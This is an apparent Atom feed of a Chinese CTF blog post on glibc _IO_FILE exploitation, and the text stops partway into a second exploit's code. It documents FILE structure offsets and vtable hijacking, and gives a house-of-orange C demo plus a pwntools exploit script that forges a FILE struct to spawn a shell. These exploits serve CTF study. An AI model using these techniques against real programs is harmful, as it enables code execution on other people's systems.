<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Requirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2019-07-12T06:41:02.389Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>_IO_FILE 利用方法</title>
    <link href="http://siriuswhiter.tk/2019/07/09/io-file-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://siriuswhiter.tk/2019/07/09/io-file-利用方法/</id>
    <published>2019-07-09T07:51:56.000Z</published>
    <updated>2019-07-12T06:41:02.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>细节知识可以看<a href="https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p><p>FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。<br><figure class="image-box">                <img src="/2019/07/09/io-file-利用方法/1.png" alt="图示" title="" class="">                <p>图示</p>            </figure></p><p>所以新建的文件句柄的chains会指向stderr</p><p>IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下：</p><p>struct _IO_FILE_plus<br>{<br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}</p><p>输出方法,eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *) stdout</span><br></pre></td></tr></table></figure></p><h3 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="IO_FILE 结构体"></a>IO_FILE 结构体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;/* End of get area. */</span><br><span class="line">  char* _IO_read_base;/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;                       /* 偏移： 0x68-0x70 */</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;                    </span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="偏移记录"><a href="#偏移记录" class="headerlink" title="偏移记录"></a>偏移记录</h3><p>方便在使用时查看偏移进行伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">&apos;i386&apos;:0x98,</span><br><span class="line">&apos;amd64&apos;:0xe0</span><br><span class="line">&#125;</span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">&apos;i386&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x4:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x8:&apos;_IO_read_end&apos;,</span><br><span class="line">0xc:&apos;_IO_read_base&apos;,</span><br><span class="line">0x10:&apos;_IO_write_base&apos;,</span><br><span class="line">0x14:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x18:&apos;_IO_write_end&apos;,</span><br><span class="line">0x1c:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x20:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x24:&apos;_IO_save_base&apos;,</span><br><span class="line">0x28:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x2c:&apos;_IO_save_end&apos;,</span><br><span class="line">0x30:&apos;_markers&apos;,</span><br><span class="line">0x34:&apos;_chain&apos;,</span><br><span class="line">0x38:&apos;_fileno&apos;,</span><br><span class="line">0x3c:&apos;_flags2&apos;,</span><br><span class="line">0x40:&apos;_old_offset&apos;,</span><br><span class="line">0x44:&apos;_cur_column&apos;,</span><br><span class="line">0x46:&apos;_vtable_offset&apos;,</span><br><span class="line">0x47:&apos;_shortbuf&apos;,</span><br><span class="line">0x48:&apos;_lock&apos;,</span><br><span class="line">0x4c:&apos;_offset&apos;,</span><br><span class="line">0x54:&apos;_codecvt&apos;,</span><br><span class="line">0x58:&apos;_wide_data&apos;,</span><br><span class="line">0x5c:&apos;_freeres_list&apos;,</span><br><span class="line">0x60:&apos;_freeres_buf&apos;,</span><br><span class="line">0x64:&apos;__pad5&apos;,</span><br><span class="line">0x68:&apos;_mode&apos;,</span><br><span class="line">0x6c:&apos;_unused2&apos;,</span><br><span class="line">0x94:&apos;vtable&apos;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&apos;amd64&apos;:&#123;</span><br><span class="line">0x0:&apos;_flags&apos;,</span><br><span class="line">0x8:&apos;_IO_read_ptr&apos;,</span><br><span class="line">0x10:&apos;_IO_read_end&apos;,</span><br><span class="line">0x18:&apos;_IO_read_base&apos;,</span><br><span class="line">0x20:&apos;_IO_write_base&apos;,</span><br><span class="line">0x28:&apos;_IO_write_ptr&apos;,</span><br><span class="line">0x30:&apos;_IO_write_end&apos;,</span><br><span class="line">0x38:&apos;_IO_buf_base&apos;,</span><br><span class="line">0x40:&apos;_IO_buf_end&apos;,</span><br><span class="line">0x48:&apos;_IO_save_base&apos;,</span><br><span class="line">0x50:&apos;_IO_backup_base&apos;,</span><br><span class="line">0x58:&apos;_IO_save_end&apos;,</span><br><span class="line">0x60:&apos;_markers&apos;,</span><br><span class="line">0x68:&apos;_chain&apos;,</span><br><span class="line">0x70:&apos;_fileno&apos;,</span><br><span class="line">0x74:&apos;_flags2&apos;,</span><br><span class="line">0x78:&apos;_old_offset&apos;,</span><br><span class="line">0x80:&apos;_cur_column&apos;,</span><br><span class="line">0x82:&apos;_vtable_offset&apos;,</span><br><span class="line">0x83:&apos;_shortbuf&apos;,</span><br><span class="line">0x88:&apos;_lock&apos;,</span><br><span class="line">0x90:&apos;_offset&apos;,</span><br><span class="line">0x98:&apos;_codecvt&apos;,</span><br><span class="line">0xa0:&apos;_wide_data&apos;,</span><br><span class="line">0xa8:&apos;_freeres_list&apos;,</span><br><span class="line">0xb0:&apos;_freeres_buf&apos;,</span><br><span class="line">0xb8:&apos;__pad5&apos;,</span><br><span class="line">0xc0:&apos;_mode&apos;,</span><br><span class="line">0xc4:&apos;_unused2&apos;,</span><br><span class="line">0xd8:&apos;vtable&apos;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IO-jump-t表结构"><a href="#IO-jump-t表结构" class="headerlink" title="IO_jump_t表结构"></a>IO_jump_t表结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    JUMP_FIELD(size_t, __dummy);</span><br><span class="line">    JUMP_FIELD(size_t, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    /* showmany */</span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="常用对应iofile函数"><a href="#常用对应iofile函数" class="headerlink" title="常用对应iofile函数"></a>常用对应iofile函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fread    -&gt; __xsgetn   -&gt; __doallocate  -&gt; __stat  -&gt; __underflow -&gt; __read</span><br><span class="line">fwrite    -&gt; __xsputn   -&gt; __docallocate  -&gt; __overflow  -&gt; __write</span><br><span class="line">fclose    -&gt;  __finish  -&gt; __overflow  /  -&gt; __fclose   //根据标志位来改变模式</span><br><span class="line">malloc_printerr    -&gt; __overflow</span><br><span class="line">exit    -&gt; _setbuf</span><br></pre></td></tr></table></figure><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在源码分析中我们知道io相关操作最后会调用vtable中的函数，所以利用方法就是修改vtable中的值，或者是实现对整个FILE结构体的伪造来修改虚表，当然本质上没有太大的区别。</p><h1 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h1><p>还是使用下how2heap上的例子，这里是结合了house of orange，可以跟着源码调试理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int winner ( char *ptr);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char *p1, *p2;</span><br><span class="line">    size_t io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    // 首先分配一个 0x400 的 chunk</span><br><span class="line">    p1 = malloc(0x400-16);</span><br><span class="line"></span><br><span class="line">    // 拿到 top chunk的地址</span><br><span class="line">    top = (size_t *) ( (char *) p1 + 0x400 - 16);</span><br><span class="line">    // 修改 top chunk 的 size</span><br><span class="line">    top[1] = 0xc01;</span><br><span class="line"></span><br><span class="line">    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin</span><br><span class="line">    p2 = malloc(0x1000);</span><br><span class="line"></span><br><span class="line">    // 根据 fd 指针的偏移计算 io_list_all 的地址</span><br><span class="line">    io_list_all = top[2] + 0x9a8;</span><br><span class="line"></span><br><span class="line">    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发</span><br><span class="line">    top[3] = io_list_all - 0x10;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     设置 fp 指针指向位置 开头 为 /bin/sh</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);</span><br><span class="line"></span><br><span class="line">    // 修改 top chunk 的 大小 为 0x60</span><br><span class="line">    top[1] = 0x61;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">      为了可以正常调用 overflow() ，需要满足一些条件</span><br><span class="line">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = 0; </span><br><span class="line">    fp-&gt;_IO_write_base = (char *) 2;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (char *) 3; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 设置虚表</span><br><span class="line">    size_t *jump_table = &amp;top[12]; // controlled memory</span><br><span class="line">    jump_table[3] = (size_t) &amp;winner;</span><br><span class="line">    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8</span><br><span class="line"></span><br><span class="line">    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去</span><br><span class="line">    // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, </span><br><span class="line">    // 也就是 main_arena+88 </span><br><span class="line">    // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 </span><br><span class="line">    // 所以要把 top的 size 设置为 0x60</span><br><span class="line">    malloc(10);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int winner(char *ptr)</span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现，实际上在利用时是将top chunk放入unsorted bin中之后将其作为FILE结构体，并将虚表设置在了FILE结构体中，最后触发malloc_printerr，内部调用<strong>libc_message，再内部调用abort，abort中调用fflush即_IO_flush_all_lockp，其中调用</strong>OVERFLOW时调用 vtable中的 __overflow，触发system(‘/bin/sh’)。</p><p>当然利用方法不止这一种，也能够使程序去调用其他函数getshell。</p><h1 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h1><h2 id="task-challenge1"><a href="#task-challenge1" class="headerlink" title="task_challenge1"></a>task_challenge1</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>控制fp指针伪造FILE 与 vtable，因为fclose时调用vtable中的_finish，所以将其覆盖为system</p><p>伪造的FILE结构体前四个字节需要满足 flags &amp; is_filebuf 即 flags &amp; 0x2000为0，会直接调用_io_finish<br>0xffffdfff  &amp; 0x2000 = 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line"></span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一道iofile练手题，与pwnable.tw上那道有些相似，可以输入，输出，退出</p><p>输入直接调用gets，在bss段，可以覆盖打开文件的指针，伪造结构体可以一块进行<br>退出会调用fclose关闭文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 ; char s[256]</span><br><span class="line">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get+4↑o</span><br><span class="line">.bss:00000000006010C0                                         ; put+4↑o</span><br><span class="line">.bss:00000000006011C0 ; FILE *stream</span><br><span class="line">.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: exits+4↑r</span><br></pre></td></tr></table></figure></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./task_challenge1&apos;)</span><br><span class="line">elf = ELF(&apos;./task_challenge1&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;task_challenge1&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = 0x6010c0</span><br><span class="line">system = 0x400897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = p32(0xffffdfff)+&apos;;/bin/sh\x00&apos;</span><br><span class="line">fake_file = fake_file.ljust(0xd8,&apos;\0&apos;)</span><br><span class="line">vtable = buf_addr+0xe0</span><br><span class="line">fake_file += p64(vtable)</span><br><span class="line"></span><br><span class="line">pay = fake_file</span><br><span class="line">pay += p64(0)*2</span><br><span class="line">pay += p64(system)             #vtable finish , fclose will call this func.</span><br><span class="line">pay = pay.ljust(0x100,&apos;\0&apos;)</span><br><span class="line">pay += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">#sh.sendline(&apos;3&apos;)</span><br><span class="line">#exits()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="方向-1"><a href="#方向-1" class="headerlink" title="方向"></a>方向</h3><p>就是演示代码的实际利用。</p><p>malloc_printerr 会调用_io_overflow<br>伪造被放入unsorted bin中的top chunk为FILE 结构体，使之能够绕过检查进入_IO_OVERFLOW (fp, EOF)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)  //需要bypass的条件</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))                        </span><br><span class="line">#endif</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)                              //改 _IO_OVERFLOW 为 system 劫持程序流！</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>即需要满足任意一种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>house of orange 的开山之作，因而之后这种利用方法就叫做house of orange<br>题目可以 build ,upgrade ,see<br>build 会创建三个chunk，一个保存其中两个的指针，一个保存大小与颜色，最后为用户自定义大小不大于0x1000的chunk。<br>upgrade 时没有考虑build时的大小，所以会直接溢出<br>see 正常展示，后面会用来泄露</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 